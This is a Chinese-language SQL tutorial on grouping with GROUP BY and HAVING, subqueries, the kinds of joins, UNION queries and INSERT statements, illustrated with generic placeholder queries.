<h2 id="分组数据"><a href="#分组数据" class="headerlink" title="分组数据"></a>分组数据</h2><p>如何对数据进行分组，以便汇总表内容的子集。这涉及两个新的 SELECT 子句：GROUP BY 子句和 HAVING 子句。</p>
<p>之前我们所有计算都是在表的所有数据或匹配特定的 WHERE 子句的数据上进行的，这里我们可以使用分组将数据分为多个逻辑组，对每个组进行聚集计算</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- GROUP BY 按column1排序并分组</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> num_column <span class="token keyword">FROM</span> table1 <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>因为使用了 GROUP BY，就不必指定要计算和估值的每个组了，系统会自动对每个组而不是整个结果进行聚集。</p>
<p>GROUP BY 的重要规定：</p>
<ul>
<li>GROUP BY 子句可以包含任意数目的列，因而可以对分组进行嵌套，更细致地进行数据分组</li>
<li>如果在 GROUP BY 子句中嵌套了分组，数据将在最后指定的分组上进行汇总</li>
<li>GROUP BY 子句中列出的每一列都必须是检索列或有效的表达式（不能是聚集函数）。如果在 SELECT 中使用表达式，则必须在 GROUP BY 子句中指定相同的表达式，不能使用别名</li>
<li>大多数 SQL 实现不允许 GROUP BY 带有长度可变的数据类型的列（如文本或备注型字段</li>
<li>除聚集计算语句外，SELECT 语句中的每一列都必须在 GROUP BY 子句中给出</li>
<li>如果分组列中包含具有 NULL 值的行，则 NULL 将作为一个分组返回，如果列中有多行 NULL 值，它们将分为一组<br>-GROUP BY 子句必须出现在 WHERE 子句后，ORDER BY 子句前</li>
</ul>
<blockquote>
<p>提示：<strong>ALL 子句</strong><br>SQL Server 等有些 SQL 实现在 GROUP BY 中支持可选的 ALL 子句。这个子句可以用来返回所有分组，即使是没有匹配行的分组也返回（此时，聚集将返回 NULL）。</p>
<p>注意：<strong>通过相对位置指定列</strong><br>有的 SQL 实现允许根据 SELECT 列表中的位置指定 GROUP BY 的列。例如 GROUP BY 2, 1 可表示按 SELECT 的第二个列分组，然后再按第一个列分组。虽然这种速记语法方便，但并非所有 SQL 实现都支持，且使用它易在编辑 SQL 语句时出错。</p>
</blockquote>
<h3 id="过滤分组"><a href="#过滤分组" class="headerlink" title="过滤分组"></a>过滤分组</h3><p>WHERE 过滤指定的是行而不是分组，WHERE 没有分组的概念。此时使用 HAVING 子句过滤分组。所有类型的 WHERE 子句都可以用 HAVING 替代，唯一的差别是，WHERE 过滤行，而 HAVING 过滤分组。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> num_column <span class="token keyword">FROM</span> table1 <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> column1 <span class="token keyword">HAVING</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>WHERE 在数据分组前进行过滤，HAVING 在数据分组后进行过滤。WHERE 排除的行不包括在分组中，可能会改变计算值，从而影响 HAVING 子句中基于这些值过滤掉的分组。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> num_column <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column2 <span class="token operator">>=</span> <span class="token number">4</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> column1 <span class="token keyword">HAVING</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>说明：使用 HAVING 和 WHERE<br>HAVING 和 WHERE 非常类似，若不指定 GROUP BY，则大多数 DBMS 会同等对待它们。使用 HAVING 时应该结合 GROUP BY 子句，而 WHERE 子句用于标准的行级过滤。</p>
</blockquote>
<h3 id="分组和排序"><a href="#分组和排序" class="headerlink" title="分组和排序"></a>分组和排序</h3><p>GROUP BY 和 ORDER BY 经常完成相同的工作，但它们非常不同。</p>
<table>
<thead>
<tr>
<th>ORDER BY</th>
<th>GROUP BY</th>
</tr>
</thead>
<tbody><tr>
<td>对输出的数据进行排序</td>
<td>对行分组，但输出可能不是分组的顺序</td>
</tr>
<tr>
<td>任意列都可以使用（甚至非选择的列也可以使用）</td>
<td>只可能使用选择列或表达式列，而且必需使用每个选择列表达式</td>
</tr>
<tr>
<td>不一定需要</td>
<td>如果与聚集函数一起使用列（或表达式），则必需使用</td>
</tr>
</tbody></table>
<p>我们经常发现用 GROUP BY 分组数据确实是以分组顺序输出的，但这不是 SQL 规范所要求的。<strong>因此一般在使用 GROUP BY 子句时， 也应该给出 ORDER BY 子句，这是保证数据正确排序的唯一方法。</strong>千万不要仅依赖 GROUP BY 排序数据。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> num_column <span class="token keyword">FROM</span> table1 <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> column1 <span class="token keyword">HAVING</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">3</span> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> num_column<span class="token punctuation">,</span> column1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Access 不允许按别名排序，因此在 Access 中应使用实际的计算或字段位置替换 items（在 ORDER BY 子句中），即 ORDER BY COUNT(*), column1 或 ORDER BY 2, column1。</p>
<h3 id="SELECT-子句顺序"><a href="#SELECT-子句顺序" class="headerlink" title="SELECT 子句顺序"></a>SELECT 子句顺序</h3><table>
<thead>
<tr>
<th>子句</th>
<th>说明</th>
<th>是否必须使用</th>
</tr>
</thead>
<tbody><tr>
<td>SELECT</td>
<td>要返回的列或表达式</td>
<td>是</td>
</tr>
<tr>
<td>FROM</td>
<td>从中检索数据的表</td>
<td>仅在从表中选择数据时使用</td>
</tr>
<tr>
<td>WHERE</td>
<td>行级过滤</td>
<td>否</td>
</tr>
<tr>
<td>GROUP BY</td>
<td>分组说明</td>
<td>仅在按组计算聚集时使用</td>
</tr>
<tr>
<td>HAVING</td>
<td>组级过滤</td>
<td>否</td>
</tr>
<tr>
<td>ORDER BY</td>
<td>输出排序顺序</td>
<td>否</td>
</tr>
</tbody></table>
<h2 id="使用子查询"><a href="#使用子查询" class="headerlink" title="使用子查询"></a>使用子查询</h2><blockquote>
<p><strong>查询（query）</strong></p>
<p>任何 SQL 语句都是查询，但查询术语一般是指 SELECT 语句。</p>
</blockquote>
<p>SQL 还允许创建子查询（subquery），即嵌套在其他查询中的查询</p>
<p>由于这里我们使用的都是关系型数 据库，客户端最终要使用的数据通常不是来自于单一的一张表，而是通过表的关联关系从多个表中获取数据。从每个表中获取数据都可以单独作为一个查询来执行，可以把一条 SELECT 语句返回的结果用于另一条 SELECT 语句的 WHERE 子句。我们也可以使用子查询把 3 个查询组合成一条语句。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1_2 <span class="token operator">IN</span> <span class="token punctuation">(</span>
  <span class="token keyword">SELECT</span> column1_2 <span class="token keyword">FROM</span> table2 <span class="token keyword">WHERE</span> column2_3 <span class="token operator">IN</span> <span class="token punctuation">(</span>
    <span class="token keyword">SELECT</span> column2_3 <span class="token keyword">FROM</span> table3 <span class="token keyword">WHERE</span> column3 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在 WHERE 子句中使用子查询能够编写出功能很强且灵活的 SQL 语句。对于能嵌套的子查询的数目没有限制，不过在实际使用时由于性能的限制，不能嵌套太多的子查询。</p>
<blockquote>
<p>注意：<strong>只能是单列</strong><br>作为子查询的 SELECT 语句只能查询单个列，企图检索多个列将返回错误。</p>
<p>注意：<strong>子查询和性能</strong><br>使用子查询并不总是执行这类数据检索的最有效方法</p>
</blockquote>
<h3 id="作为计算字段使用子查询"><a href="#作为计算字段使用子查询" class="headerlink" title="作为计算字段使用子查询"></a>作为计算字段使用子查询</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">(</span>
  <span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> table2 <span class="token keyword">WHERE</span> table2<span class="token punctuation">.</span>column1_2 <span class="token operator">=</span> table1<span class="token punctuation">.</span>column1_2
<span class="token punctuation">)</span> <span class="token keyword">AS</span> column3 <span class="token keyword">FROM</span> table1 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这里 table2.column1_2 是完全限定列名，用一个句点分隔表名和列名，在有可能混淆列名时必须使用这种语法。如果在 SELECT 语句中操作多个表，就应使用完全限定列名来避免歧义。</p>
<h2 id="联结表"><a href="#联结表" class="headerlink" title="联结表"></a>联结表</h2><p>SQL 最强大的功能之一就是能在数据查询的执行中联结（join）表。</p>
<p>相同的数据出现多次并不好，这是关系数据库设计的基础。关系表的设计就是要把信息分解成多个表，一类数据一个表。各表通过某些共同的值互相关联（所以才叫关系数据库）。</p>
<p>将数据分解为多个表能更有效地存储，更方便地处理，且可伸缩性更好，但这也是有代价的。如果数据存储在多个表中，怎样用一条 SELECT 语句就检索出数据呢？答案是使用联结。简单说，联结是一种在一条 SELECT 语句中关联表的机制。使用特殊语法可以联结多个表返回一组输出，联结在<strong>运行时</strong>关联表中正确的行。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1<span class="token punctuation">,</span> table2 <span class="token keyword">WHERE</span> table1<span class="token punctuation">.</span>column1_2 <span class="token operator">=</span> table2<span class="token punctuation">.</span>column1_2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="WHERE-子句重要性（叉联结）"><a href="#WHERE-子句重要性（叉联结）" class="headerlink" title="WHERE 子句重要性（叉联结）"></a>WHERE 子句重要性（叉联结）</h3><p>在联结两个表时，实际要做的是将第一个表中的每一行与第二个表中的每一行配对。WHERE 子句作为过滤条件，只包含那些匹配条件的行。没有 WHERE 子句，第一个表中每一行将与第二个表中的每一行配对，而不管它们逻辑上是否能配在一起。</p>
<blockquote>
<p><strong>笛卡尔积（cartesian product）</strong><br>由没有联结条件的表关系返回的结果为笛卡尔积。检索出的行的数目将是第一个表中的行数乘以第二个表中的行数。返回笛卡尔积的联结也称叉联结（cross join）</p>
</blockquote>
<h3 id="内联结"><a href="#内联结" class="headerlink" title="内联结"></a>内联结</h3><p>我们常用的联结称为等值联结（equijoin），它基于两个表之间的相等测试，这种联结也称为内联结（innerjoin）。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> table2 <span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column1_2 <span class="token operator">=</span> table2<span class="token punctuation">.</span>column1_2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此查询语句与前面的查询语句结果完全相同，只是用 INNER JOIN 子句明确了内联结，并用特定的 ON 子句作为联结条件而不是使用 WHERE 子句，但 ON 子句实际传递的条件与 WHERE 相同。</p>
<blockquote>
<p>说明：<strong>“正确的”语法</strong><br>ANSI SQL 规范首选 INNER JOIN 语法，WHERE 子句则是简单的等值语法。DBMS 通常都支持简单格式与标准格式的内联结语法。</p>
</blockquote>
<h3 id="联结多个表"><a href="#联结多个表" class="headerlink" title="联结多个表"></a>联结多个表</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 简单格式</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3 <span class="token keyword">FROM</span> table1<span class="token punctuation">,</span> table2<span class="token punctuation">,</span> table3 <span class="token keyword">WHERE</span> table1<span class="token punctuation">.</span>column1_2 <span class="token operator">=</span> table2<span class="token punctuation">.</span>column1_2 <span class="token operator">AND</span> table2<span class="token punctuation">.</span>column2_3 <span class="token operator">=</span> table3<span class="token punctuation">.</span>column2_3<span class="token punctuation">;</span>
<span class="token comment">-- 标准格式</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3 <span class="token keyword">FROM</span> <span class="token punctuation">(</span>table1 <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> table2 <span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column1_2 <span class="token operator">=</span> table2<span class="token punctuation">.</span>column1_2<span class="token punctuation">)</span> <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> table3 <span class="token keyword">ON</span> table2<span class="token punctuation">.</span>column2_3 <span class="token operator">=</span> table3<span class="token punctuation">.</span>column2_3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>DBMS 在运行时关联指定的每个表，以处理联结。这种处理非常耗费资源，因此不要联结不必要的表。联结的表越多，性能越差。虽然 SQL 本身不限制每个联结约束中表的数目，但实际上许多 DBMS 都有限制。</p>
<p>前一章中的嵌套子查询就可以用联结来连接表。</p>
<h2 id="创建高级联结"><a href="#创建高级联结" class="headerlink" title="创建高级联结"></a>创建高级联结</h2><h3 id="使用表别名"><a href="#使用表别名" class="headerlink" title="使用表别名"></a>使用表别名</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">AS</span> A<span class="token punctuation">,</span> table2 <span class="token keyword">AS</span> B <span class="token keyword">WHERE</span> A<span class="token punctuation">.</span>column1_2 <span class="token operator">=</span> B<span class="token punctuation">.</span>column1_2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>表别名不仅能用于 WHERE 子句，还可以用于 SELECT 的列表、ORDER BY 子句以及其他语句部分。</p>
<blockquote>
<p>注意：<strong>Oracle 中没有 AS</strong><br>Oracle 不支持 AS 关键字。要在 Oracle 中使用别名，可以省略 AS，直接指定列名即可。（table1 AS A 直接写为 table1 A）<br>表别名只在查询执行中使用，与列别名不一样，表别名不返回到客户端</p>
</blockquote>
<h3 id="自联结"><a href="#自联结" class="headerlink" title="自联结"></a>自联结</h3><p>使用表别名的一个主要原因是能在一条 SELECT 语句中不止一次引用相同的表。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column2 <span class="token operator">=</span> <span class="token punctuation">(</span>
  <span class="token keyword">SELECT</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column3 <span class="token operator">=</span> <span class="token string">'foo'</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这里我们要找到 table1 中 column2 与 column3 为 foo 时的 column2 相同的所有数据。第一种方案使用了子查询，我们再来看看使用自联结的方案。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> t1<span class="token punctuation">.</span>column1<span class="token punctuation">,</span> t1<span class="token punctuation">.</span>column2<span class="token punctuation">,</span> t2<span class="token punctuation">.</span>column3 <span class="token keyword">FROM</span> table1 <span class="token keyword">AS</span> t1<span class="token punctuation">,</span> table1 <span class="token keyword">AS</span> t2 <span class="token keyword">WHERE</span> t1<span class="token punctuation">.</span>column2 <span class="token operator">=</span> t2<span class="token punctuation">.</span>column2 <span class="token operator">AND</span> t2<span class="token punctuation">.</span>column3 <span class="token operator">=</span> <span class="token string">'foo'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此查询中使用的两个表其实是相同的两个表，虽然 table1 直接出现两次是完全合法的，但是对 table1 的引用是有歧义的，因为 DBMS 不知道你引用的是哪个 table1 表，会返回错误，因此要使用表别名。</p>
<blockquote>
<p>提示：<strong>用自联结而不用子查询</strong><br>自联结通常作为外部语句，用来替代从相同表中检索数据的子查询语句。虽然最终结果是相同的，但许多 DBMS 处理联结远比处理子查询快得多。</p>
</blockquote>
<h3 id="自然联结"><a href="#自然联结" class="headerlink" title="自然联结"></a>自然联结</h3><p>自然连结（natural join）是一种特殊的等值连结，它要求两个关系中进行比较的分量必须是相同的属性组，并且在结果中把重复的属性列去掉。而等值连结并不去掉重复的属性列。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 内联接（等值联接）</span>
<span class="token keyword">SELECT</span> t1<span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">,</span> t2<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">AS</span> t1 <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> table2 <span class="token keyword">AS</span> t2 <span class="token keyword">ON</span> t1<span class="token punctuation">.</span>column1_2 <span class="token operator">=</span> t2<span class="token punctuation">.</span>column1_2<span class="token punctuation">;</span>
<span class="token comment">-- 自然联接</span>
<span class="token keyword">SELECT</span> t1<span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">,</span> t2<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">AS</span> t1 <span class="token keyword">NATURAL</span> <span class="token keyword">JOIN</span> table2 <span class="token keyword">AS</span> t2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p>等值联结不要求属性值完全相同，自然联结属性值必须完全相同</p>
</li>
<li><p>等值联结不把重复属性去掉，自然联结去除了重复属性</p>
</li>
<li><p>一般建立的内联结都是自然联结，几乎不会用到非自然联结的内联结</p>
</li>
</ul>
<h3 id="外联结"><a href="#外联结" class="headerlink" title="外联结"></a>外联结</h3><p>外联结指包含了那些在相关表中没有关联的行的联接。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">LEFT</span> <span class="token keyword">OUTER</span> <span class="token keyword">JOIN</span> table2 <span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column1_2 <span class="token operator">=</span> table2<span class="token punctuation">.</span>column1_2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>必须使用 RIGHT 或 LEFT 关键字指定包括所有行的表，LEFT 指左边的表包含所有行，RIGHT 指右边的表包含所有行。</p>
<blockquote>
<p>注意：<strong>SQLite 仅支持左外联结</strong><br>左外联结与右外联结唯一的区别就是表的顺序，可以通过调整表的顺序用左外联结实现右外联结的功能。</p>
</blockquote>
<p>全外联接（full outer join），它检索两个表中所有行并关联那些可以关联的行。全外联结包含两个表的不关联的行。</p>
<blockquote>
<p>注意：<strong>FULL OUTER JOIN 并非所有 SQL 实现支持</strong><br>Access、MariaDB、MySQL、Open Office Base 和 SQLite 都不支持全外联结</p>
</blockquote>
<h3 id="使用带聚集函数的联结"><a href="#使用带聚集函数的联结" class="headerlink" title="使用带聚集函数的联结"></a>使用带聚集函数的联结</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table1<span class="token punctuation">.</span>column1<span class="token punctuation">,</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>table2<span class="token punctuation">.</span>column2<span class="token punctuation">)</span> <span class="token keyword">AS</span> num_column <span class="token keyword">FROM</span> table1 <span class="token keyword">LEFT</span> <span class="token keyword">OUTER</span> <span class="token keyword">JOIN</span> table2 <span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column1 <span class="token operator">=</span> table2<span class="token punctuation">.</span>column1 <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> table1<span class="token punctuation">.</span>column1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><p>应该总是提供联结条件，否则会得出笛卡尔积</p>
</li>
<li><p>在一个联结中可以包含多个表，甚至可以对每个联结采用不同的联结类型</p>
</li>
</ul>
<h2 id="组合查询"><a href="#组合查询" class="headerlink" title="组合查询"></a>组合查询</h2><p>SQL 允许执行多个查询（多条 SELECT 语句），并将结果作为一个查询结果返回。这些组合查询通常称为并（union）或复合查询（compound query）。</p>
<p>一般有两种情况需要使用组合查询：</p>
<ul>
<li><p>在一个查询中从不同的表返回结构数据</p>
</li>
<li><p>对一个表执行多个查询，按一个查询返回数据</p>
</li>
</ul>
<blockquote>
<p>提示：<strong>组合查询和多个 WHERE 条件</strong><br>任何具有多个 WHERE 子句的 SELECT 语句都可以作为一个组合查询</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 组合查询</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column4 <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">)</span>
<span class="token keyword">UNION</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token comment">-- 多WHERE条件</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column4 <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">)</span> <span class="token operator">OR</span> column1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这个简单的例子中，使用 UNION 可能比使用 WHERE 子句更复杂。但对于较复杂的过滤条件，或者从多个表中检索数据的情形，使用 UNION 可能会使处理更简单。</p>
<blockquote>
<p>提示：<strong>UNION 的限制</strong><br>SQL 标准没有限制 UNION 组合 SELECT 语句的数目，但是不同的 SQL 实现可能会有不同</p>
<p>注意：<strong>性能问题</strong><br>多数 DBMS 使用内部查询优化程序，在处理各条 SELECT 语句前组合它们。理论上，使用多条 WHERE 子句条件与使用 UNION 组合查询没有实质上的性能差别。</p>
</blockquote>
<p>组合查询规则</p>
<ul>
<li><p>UNION 必须由两条或两条以上的 SELECT 语句组成，语句间用关键字 UNION 分隔</p>
</li>
<li><p>UNION 中的每个查询必须包含相同的列、表达式或聚集函数（次序可不同）</p>
</li>
<li><p>列数据类型必须兼容：类型不必完全相同，但是必须是 DBMS 可以隐式转换的类型</p>
</li>
</ul>
<h3 id="包含或取消重复的行"><a href="#包含或取消重复的行" class="headerlink" title="包含或取消重复的行"></a>包含或取消重复的行</h3><p>UNION 从查询结果集中自动去除了重复的行。若想返回所有匹配行，可使 UNION ALL 替换 UNION</p>
<h3 id="对组合查询结果排序"><a href="#对组合查询结果排序" class="headerlink" title="对组合查询结果排序"></a>对组合查询结果排序</h3><p>使用 UNION 组合查询时，只能使用一条 ORDER BY 子句，它必须位于最后一条 SELECT 语句之后，对于结果集，不存在用一种方式排序一部分，而又用另一种方式排序另一部分的情况，因此不允许使用多条 ORDER BY 子句。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column4 <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">)</span>
<span class="token keyword">UNION</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>虽然看起来 ORDER BY 只是最后一条 SELECT 语句的组成部分，但实际上 DBMS 将用它来排序所有 SELECT 语句返回的所有结果。</p>
<blockquote>
<p>说明：<strong>其他类型的 UNION</strong><br>某些 DBMS 还支持另外两种 UNION：EXCEPT（有时称为 MINUS）可以用来检索只在第一个表中存在而在第二个表中不存在的行；而 INTERSECT 可用来检索两个表中都存在的行。这些 UNION 比较少用，因为相同的结果可以使用联结得到。</p>
<p>提示：<strong>操作多个表</strong><br>UNION 在组合多个表的数据时也很有用，即使是有不匹配列名的表，在这种情况下，可以将 UNION 与别名组合，检索一个结果集</p>
</blockquote>
<h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table1 <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'zoo'</span><span class="token punctuation">,</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用这种方式插入数据时必须给每一列提供一个值，如果某列没有值，则应该使用 NULL 值（假定表允许对该列指定空值），各列必须以它们在表定义中出现的次序填充。</p>
<blockquote>
<p>提示：<strong>INTO 关键字</strong><br>在某些 SQL 实现中，跟在 INSERT 后的 INTO 关键字是可选的。但最好还是提供这个关键字以保证代码的可移植性。</p>
</blockquote>
<p>虽然这种语法简单，但高度依赖表中列的定义次序，一旦表结构改变，代码就会失效，因此应该尽量避免这种简单语法。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table1<span class="token punctuation">(</span>column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3<span class="token punctuation">,</span> column4<span class="token punctuation">)</span> <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'zoo'</span><span class="token punctuation">,</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这个例子与前一个例子结果完全相同，但好处是即使表结构改变，这条语句仍然能生效。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table1<span class="token punctuation">(</span>column2<span class="token punctuation">,</span> column1<span class="token punctuation">,</span> column3<span class="token punctuation">)</span> <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'zoo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注意：</p>
<ol>
<li><p>不要使用没有明确给出列的简单 INSERT 语句，给出列能使 SQL 代码在表结构变化时依然有效</p>
</li>
<li><p>如不提供列名，则必须给每个列提供一个值；若提供列名，则必须给列出的每个列一个值</p>
</li>
<li><p>如果表定义允许，则可以在 INSERT 操作中省略某些列，省略的列必须满足以下某个条件</p>
<ul>
<li>该列定义允许 NULL 值</li>
<li>在表定义中给出默认值</li>
</ul>
</li>
<li><p>若表中不允许有 NULL 值或默认值，这时却省略了表中的值，就会产生错误消息，插入失败</p>
</li>
</ol>
